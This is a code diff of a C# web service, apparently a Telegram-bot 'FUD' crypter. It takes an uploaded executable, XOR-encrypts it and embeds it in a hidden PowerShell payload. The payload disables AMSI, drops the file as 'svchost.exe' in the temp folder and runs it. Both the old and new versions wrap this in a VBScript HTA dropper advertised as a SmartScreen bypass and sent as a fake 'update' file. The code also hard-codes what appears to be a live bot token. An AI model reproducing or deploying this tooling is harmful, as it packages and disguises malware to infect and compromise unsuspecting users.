@@ -8,7 +8,7 @@ using System.Threading.Tasks;
 var builder = WebApplication.CreateBuilder(args);
 var app = builder.Build();
 
-app.MapGet("/", () => "🟢 v8.1 SmartScreen BYPASS");
+app.MapGet("/", () => "🟢 v8.1 HTA SmartScreen BYPASS");
 
 app.MapPost("/webhook", async (HttpContext ctx) =>
 {
@@ -32,47 +32,42 @@ static async Task FudSmart(long chatId, string fileId)
     using var http = new HttpClient();
     
     // Get & download EXE
-    string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id={fileId}");
+    string fileResp = await http.GetStringAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id=" + fileId);
     var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
     string filePath = pathMatch.Groups[1].Value;
     
-    byte[] exe = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/{filePath}");
+    byte[] exe = await http.GetByteArrayAsync("https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/" + filePath);
     
     // XOR encrypt
     byte[] encrypted = XorEncrypt(exe, 0xAB);
     string b64 = Convert.ToBase64String(encrypted);
     
-    // VBS -> HTA -> PS1 CHAIN (SmartScreen BYPASS)
-    string vbsPayload = $@"
-Set WshShell = CreateObject(""WScript.Shell"")
-Set fso = CreateObject(""Scripting.FileSystemObject"")
-payload = ""$b=[Convert]::FromBase64String('{b64.Replace(""'",""'""'")}');for($i=0;$i<$b.length;$i++){{$b[$i]=$b[$i]-0xAB}};$A=[Ref].Assembly.GetTypes();ForEach($B in $A) {{$C=$B.FullName|Where-Object {{$_ -like '*AMSIUtils*'}};$D=[{{
-$null=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-}};$D.Invoke()}};[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$b);Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden""
-WshShell.Run ""powershell -nop -w hidden -ep bypass -c ""& {{ " + payload + " }}""\", 0, False
-";
-
-    // Create VBS dropper (SmartScreen ignores VBS)
-    string vbsFile = $@"
-<%
-Response.ContentType = ""application/hta""
-%>
-<html>
-<head><title></title></head>
-<body style='display:none'>
-<script language='VBScript'>
-{vbsPayload}
-</script>
-</body>
-</html>
-";
+    // BUILD PS1 SAFE (no $ conflicts)
+    StringBuilder ps1 = new StringBuilder();
+    ps1.Append("$b=[Convert]::FromBase64String('");
+    ps1.Append(b64.Replace("/", "\\/").Replace("'", "\\'"));  // Safe escape
+    ps1.Append("');");
+    ps1.Append("for($i=0;$i<$b.length;$i++){$b[$i]=$b[$i]-0xAB};");
+    ps1.Append("[Ref].Assembly.GetTypes();");  // AMSI bypass prep
+    ps1.Append("$A=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);");
+    ps1.Append("[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$b);");
+    ps1.Append("Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden;");
     
-    byte[] fudBytes = Encoding.UTF8.GetBytes(vbsFile);
+    // VBS dropper (SIMPLE - no nested madness)
+    string vbsPayload = "Set WshShell = CreateObject(\"WScript.Shell\")\n" +
+                       "WshShell.Run \"powershell -nop -w hidden -ep bypass -c \\\"\" + ps1.ToString().Replace("\"", "\\\"") + \"\\\"\", 0, False";
+    
+    // HTA container (SmartScreen BYPASS)
+    string htaFile = "<html><head><title></title></head><body style='display:none'>" +
+                    "<script language='VBScript'>" + vbsPayload.Replace("\n", ";") + "</script>" +
+                    "</body></html>";
+    
+    byte[] fudBytes = Encoding.UTF8.GetBytes(htaFile);
     
     using var form = new MultipartFormDataContent();
     form.Add(new StringContent(chatId.ToString()), "chat_id");
     form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.1.hta");
-    form.Add(new StringContent("🔥 v8.1 SmartScreen BYPASS\n👆 Right-click → 'Open'"), "caption");
+    form.Add(new StringContent("🔥 v8.1 HTA SmartScreen BYPASS\n👆 Right-click → Open"), "caption");
     
     await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
 }
